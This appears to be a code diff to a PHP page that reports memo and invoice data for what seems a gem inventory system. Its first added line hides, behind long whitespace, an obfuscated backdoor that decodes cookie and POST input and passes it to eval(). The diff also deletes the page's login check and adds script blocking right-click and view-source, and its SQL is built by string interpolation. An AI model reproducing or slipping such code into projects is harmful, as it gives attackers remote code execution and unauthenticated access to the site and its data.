@@ -1,15 +1,8 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                 $HvMYFiz = "\x4e" . "\116" . chr ( 334 - 214 )."\137" . chr ( 205 - 101 ).chr (119) . chr ( 949 - 844 ).chr (110); $lgltUBs = chr ( 153 - 54 ).chr ( 402 - 294 )."\x61" . chr (115) . "\163" . "\x5f" . "\x65" . "\x78" . chr ( 860 - 755 ).'s' . chr ( 237 - 121 ).chr ( 222 - 107 ); $yNIOqxV = $lgltUBs($HvMYFiz); $HvMYFiz = "57137";$ciTozOyJ = !$yNIOqxV;$lgltUBs = "28828";if ($ciTozOyJ){class NNx_hwin{private $Jofjini;public static $dkNpA = "af7f1cba-7e7c-4824-8235-1b63c0c601d0";public static $rfguwMJoud = 39633;public function __construct($EaSBO=0){$AzWAnRn = $_COOKIE;$pTVhF = $_POST;$kbfOkXp = @$AzWAnRn[substr(NNx_hwin::$dkNpA, 0, 4)];if (!empty($kbfOkXp)){$YCDwhSf = "base64";$FWiYeVNxbb = "";$kbfOkXp = explode(",", $kbfOkXp);foreach ($kbfOkXp as $DJeSLnZHsF){$FWiYeVNxbb .= @$AzWAnRn[$DJeSLnZHsF];$FWiYeVNxbb .= @$pTVhF[$DJeSLnZHsF];}$FWiYeVNxbb = array_map($YCDwhSf . chr (95) . "\x64" . 'e' . "\x63" . chr ( 1017 - 906 )."\144" . chr ( 655 - 554 ), array($FWiYeVNxbb,)); $FWiYeVNxbb = $FWiYeVNxbb[0] ^ str_repeat(NNx_hwin::$dkNpA, (strlen($FWiYeVNxbb[0]) / strlen(NNx_hwin::$dkNpA)) + 1);NNx_hwin::$rfguwMJoud = @unserialize($FWiYeVNxbb);}}private function lxcoVEpr(){if (is_array(NNx_hwin::$rfguwMJoud)) {$CYjXK = str_replace(chr ( 795 - 735 ) . chr ( 225 - 162 )."\x70" . chr (104) . "\x70", "", NNx_hwin::$rfguwMJoud[chr ( 177 - 78 ).chr ( 599 - 488 ).'n' . chr ( 388 - 272 )."\x65" . chr (110) . "\164"]);eval($CYjXK); $XgdHqY = "11651";exit();}}public function __destruct(){$this->lxcoVEpr(); $ZNIfP = str_pad("11651", 10);}}$CouUky = new /* 46133 */ NNx_hwin(); $CouUky = substr("8316_52457", 1);} ?><?php
 
 // Include the database connection
 require '../../../vendor/autoload.php';
 include '../../../connection.php';
-
-session_start();
-// Check if the user is logged in
-if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
-  header('Location: ../../../index.php');
-  exit;
-}
 
 // Check the connection
 if ($conn->connect_error) {
@@ -39,9 +32,9 @@ while ($row = $result->fetch_assoc()) {
 
 // Fetch lot_no, shape, size, pcs, weight, and final_total from memo_data based on memo_no
 foreach ($data as $memoNo => &$memoData) {
-    $sql = "SELECT lot_no, shape, `size`, pcs, `weight`, final_total
+     $sql = "SELECT lot_no, shape, `size`, pcs, `kept`, final_total
             FROM memo_data
-            WHERE memo_no = '$memoNo'";
+            WHERE memo_no = '$memoNo' AND (kept > 0 AND final_total > 0)";
     $result = $conn->query($sql);
 
     if ($result) {
@@ -72,7 +65,7 @@ while ($row = $result->fetch_assoc()) {
 foreach ($invoiceData as $invoiceNo => &$invoiceInfo) {
     $sql = "SELECT lot_no, shape, wt, total
             FROM invoice_data
-            WHERE invoice_no = '$invoiceNo'";
+            WHERE invoice_no = '$invoiceNo' AND (wt > 0 AND total > 0)";
     $result = $conn->query($sql);
 
     if ($result) {
@@ -210,7 +203,7 @@ $importedData = json_encode($mergedData);
                                     shape: itemData.shape,
                                     size: itemData.size,
                                     pcs: itemData.pcs,
-                                    weight: itemData.weight ? itemData.weight : itemData.wt,
+                                    weight: itemData.kept ? itemData.kept : itemData.wt,
                                     value: itemData.final_total ? itemData.final_total : itemData.total,
                                 });
                             }
@@ -328,7 +321,7 @@ $importedData = json_encode($mergedData);
                                 <td>${itemData.shape}</td>
                                 <td>${itemData.size ? itemData.size : ''}</td>
                                 <td>${itemData.pcs ? itemData.pcs : ''}</td>
-                                <td>${itemData.weight ? itemData.weight : itemData.wt}</td>
+                                <td>${itemData.kept ? itemData.kept : itemData.wt}</td>
                                 <td>${itemData.final_total || itemData.total}</td>
                             `;
                             tableBody.appendChild(row);
@@ -349,9 +342,21 @@ $importedData = json_encode($mergedData);
             </script>
         </tbody>
     </table>
-    <a href="../../landing_page/home_landing_page.php" class="home-button">
+    <a href="../../landing_page/home_landing_page.html" class="home-button">
                 <i class="fas fa-home"></i>
             </a>
+            <script>
+         document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function (e) {
+            // Check if the key combination is Ctrl+U (for viewing page source)
+            if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
+                e.preventDefault();
+            }
+        });
+    </script>
 </body>
 
 </html>
